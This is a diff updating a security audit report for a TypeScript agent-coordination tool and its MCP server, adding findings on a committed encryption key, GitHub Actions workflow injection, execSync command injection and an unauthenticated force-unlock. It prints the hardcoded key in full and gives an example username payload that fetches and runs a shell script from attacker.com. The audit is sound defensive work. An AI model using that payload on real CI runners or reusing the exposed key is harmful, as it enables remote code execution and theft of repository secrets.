@@ -10,18 +10,73 @@
 
 | Severity | Count |
 |----------|-------|
-| Critical | 0     |
-| High     | 0     |
-| Medium   | 5     |
+| Critical | 1     |
+| High     | 2     |
+| Medium   | 8     |
 | Low      | 7     |
 
-The codebase demonstrates generally **strong security practices**: `execFileSync` is used consistently instead of `exec` (preventing shell injection), input validation exists for agent IDs/branch names/file paths, prototype pollution guards are in place, and TUI injection is mitigated. No critical or high severity vulnerabilities were found.
+The core library code demonstrates generally **strong security practices**: `execFileSync` is used consistently instead of `exec` (preventing shell injection), input validation exists for agent IDs/branch names/file paths, prototype pollution guards are in place, and TUI injection is mitigated in the dashboard. However, critical issues were found in scripts and CI/CD configuration.
+
+---
+
+## Critical Severity
+
+### 1. Hardcoded Cryptographic Key Committed to Repository
+
+**File:** `scripts/toak-mcp-wrapper.sh:6`
+
+```bash
+export ENVOAK_KEY="d7edd0aa19a983c449135310822a33cb4971f8b41122bd2d37785940304a0789"
+```
+
+**Issue:** A 256-bit hex key used for decrypting `config.enc` is hardcoded in a committed script. The encrypted config file (`config.enc`) is also committed to the repository. Together, these constitute a **full secret compromise** — anyone with repo access can decrypt all secrets (including `HUB_URL`, `TOAK_AGENT_ID`, and potentially other credentials). This key has been exposed in git history even if removed now.
+
+**Recommendation:** Immediately rotate all secrets encrypted by this key. Remove both `config.enc` and the wrapper script from the repository and git history. Use a secrets manager or environment-specific injection instead.
+
+---
+
+## High Severity
+
+### 2. GitHub Actions Workflow Injection
+
+**File:** `.github/workflows/auto-register.yml:45-46`
+
+```yaml
+run: |
+  AUTHOR="${{ github.actor }}"
+  BRANCH="${{ github.ref_name }}"
+```
+
+**Issue:** `github.actor` and `github.ref_name` are injected directly into a `run:` shell block without sanitization. An attacker can craft a GitHub username containing shell metacharacters (e.g., `"; curl attacker.com/shell.sh | bash #`) to achieve arbitrary command execution in the CI runner with access to repository secrets (`SUPABASE_URL`, `SUPABASE_KEY`, etc.).
+
+**Recommendation:** Pass these values via the `env:` block instead of direct interpolation:
+```yaml
+env:
+  AUTHOR: ${{ github.actor }}
+  BRANCH: ${{ github.ref_name }}
+run: |
+  echo "author=$AUTHOR" >> $GITHUB_OUTPUT
+```
+
+---
+
+### 3. Command Injection in Stress Test Script
+
+**File:** `scripts/stress-test-scenarios.js:23`
+
+```javascript
+const result = execSync(`node dist/bin/spidersan.js ${args}`, { ... });
+```
+
+**Issue:** Uses `execSync` with string interpolation instead of `execFileSync` with argument arrays. While `args` currently comes from hardcoded test strings, this is the only place in the codebase that uses this dangerous pattern. If test scenarios were ever modified to accept external input, this becomes immediately exploitable for arbitrary command execution.
+
+**Recommendation:** Replace with `execFileSync('node', ['dist/bin/spidersan.js', ...args.split(' ')])` or use `execFileSync` with proper argument arrays.
 
 ---
 
 ## Medium Severity
 
-### 1. SSRF via User-Controlled `HUB_URL` / `SUPABASE_URL`
+### 4. SSRF via User-Controlled `HUB_URL` / `SUPABASE_URL`
 
 **Files:**
 - `src/commands/conflicts.ts:25`
@@ -37,7 +92,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 2. ReDoS via Config-Supplied Regex Patterns
+### 5. ReDoS via Config-Supplied Regex Patterns
 
 **Files:**
 - `src/lib/config.ts:266-280` (`getWipPatterns`, `getHighSeverityPatterns`, `getMediumSeverityPatterns`)
@@ -50,7 +105,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 3. PostgREST Query Parameter Injection in Supabase Storage
+### 6. PostgREST Query Parameter Injection in Supabase Storage
 
 **File:** `src/storage/supabase.ts:231,346`
 
@@ -60,7 +115,33 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 4. Prototype Pollution Guard Uses `for...in` Without `hasOwnProperty`
+### 7. Force Unlock Without Authentication in MCP Server
+
+**File:** `mcp-server/src/server.ts:703-728`
+
+**Issue:** The `unlock_files` MCP tool accepts a `force` boolean parameter described as "admin only" but with no actual authentication or authorization check. Any MCP client can send `force: true` to bypass agent/token validation and unlock any file lock, undermining the entire locking mechanism.
+
+**Recommendation:** Remove the `force` flag or implement proper authorization (e.g., require a separate admin token).
+
+---
+
+### 8. TUI Markup Injection in `screen.ts`
+
+**File:** `src/tui/screen.ts:108-118`
+
+```typescript
+content += `${status} {bold}${branch.name}{/bold}\n`;
+content += `   Agent: ${branch.agent || 'unknown'}\n`;
+content += `   Files: ${files.join(', ')}\n`;
+```
+
+**Issue:** Unlike `dashboard.ts` which properly uses `escapeBlessed()`, `screen.ts` directly interpolates `branch.name`, `branch.agent`, and file paths into blessed markup strings. A malicious branch name containing `{` and `}` could inject blessed markup tags, causing UI corruption or misleading display.
+
+**Recommendation:** Apply `escapeBlessed()` to all dynamic content before rendering, consistent with `dashboard.ts`.
+
+---
+
+### 9. Prototype Pollution Guard Uses `for...in` Without `hasOwnProperty`
 
 **File:** `src/lib/config.ts:245-264`
 
@@ -70,7 +151,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 5. Unsanitized Colony Payload Used in Storage Operations
+### 10. Unsanitized Colony Payload Used in Storage Operations
 
 **File:** `src/lib/colony-subscriber.ts:155-169`
 
@@ -80,9 +161,19 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
+### 11. License Generation Script Committed Despite "DO NOT COMMIT" Warning
+
+**File:** `scripts/generate-license.mjs`
+
+**Issue:** The script header says "KEEP PRIVATE - DO NOT COMMIT" and "Store this script securely, NOT in the repo," yet it is committed. When run, it writes private signing keys to `./license-keys.json` in the working directory.
+
+**Recommendation:** Remove from repository and add to `.gitignore`.
+
+---
+
 ## Low Severity
 
-### 6. Regex Injection in `upsertEnvVar`
+### 12. Regex Injection in `upsertEnvVar`
 
 **File:** `src/commands/config.ts:112`
 
@@ -90,7 +181,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 7. Fragile Path Construction in `stale.ts`
+### 13. Fragile Path Construction in `stale.ts`
 
 **File:** `src/commands/stale.ts:30-34`
 
@@ -98,7 +189,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 8. Known Public Keys File Missing Restrictive Permissions
+### 14. Known Public Keys File Missing Restrictive Permissions
 
 **File:** `src/lib/crypto.ts:132`
 
@@ -106,7 +197,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 9. No Distinction Between Anon and Service-Role Supabase Keys
+### 15. No Distinction Between Anon and Service-Role Supabase Keys
 
 **Files:** `src/storage/supabase.ts:53-65`, `src/lib/activity.ts:196-211`
 
@@ -114,7 +205,7 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 10. Race Condition in Local Storage (TOCTOU)
+### 16. Race Condition in Local Storage (TOCTOU)
 
 **File:** `src/storage/local.ts:40-51`
 
@@ -122,15 +213,15 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ---
 
-### 11. Insecure `validateWatchDirectory` Bypass via Symlinks-to-Subdirs
+### 17. Incomplete `validateWatchDirectory` Blocklist
 
 **File:** `mcp-server/src/server.ts:25-44`
 
-**Issue:** The sensitive directory check blocks `/etc`, `/var`, etc., but a `/home/user/link -> /etc` symlink is resolved by `realpathSync` and correctly blocked. However, the allow/deny list doesn't cover all sensitive paths (e.g., `~/.ssh`, `~/.gnupg`, `~/.aws`).
+**Issue:** The sensitive directory blocklist doesn't cover `/proc`, `/sys`, `/dev`, `~/.ssh`, `~/.gnupg`, `~/.aws`, or macOS system paths. An allowlist approach would be more secure.
 
 ---
 
-### 12. `doctor.ts` Uses `sh -c` for Shell Command
+### 18. `doctor.ts` Uses `sh -c` for Shell Command
 
 **File:** `src/commands/doctor.ts:483`
 
@@ -140,11 +231,13 @@ The codebase demonstrates generally **strong security practices**: `execFileSync
 
 ## Positive Security Findings
 
-- **No shell injection:** `execFileSync` with argument arrays used consistently throughout.
+- **No shell injection in core code:** `execFileSync` with argument arrays used consistently throughout `src/` and `mcp-server/`.
 - **Input validation:** `src/lib/security.ts` provides robust validation for agent IDs, branch names, task IDs, and file paths, used consistently across commands.
 - **Prototype pollution awareness:** `deepMerge`, `setNestedValue`, and `getNestedValue` all block `__proto__`, `constructor`, `prototype`.
-- **TUI injection prevention:** `escapeBlessed()` sanitizes data before rendering in blessed TUI.
+- **TUI injection prevention:** `escapeBlessed()` sanitizes data before rendering in `dashboard.ts`.
 - **Shell escaping:** `queen.ts` uses `escapeShellString()` for generated bash scripts.
 - **Path traversal protection:** `validateRepoPath()` and `validateFilePath()` block `..` traversal.
 - **Zod validation in MCP server:** All MCP tool inputs are validated with Zod schemas.
 - **Good crypto:** TweetNaCl with X25519 + XSalsa20-Poly1305; private keys saved with `mode: 0o600`.
+- **Repo root enforcement:** MCP server's `request_resolution` validates file reads stay within repo root using `realpathSync`.
+- **Branch name validation:** MCP server validates branch names via `git check-ref-format`.
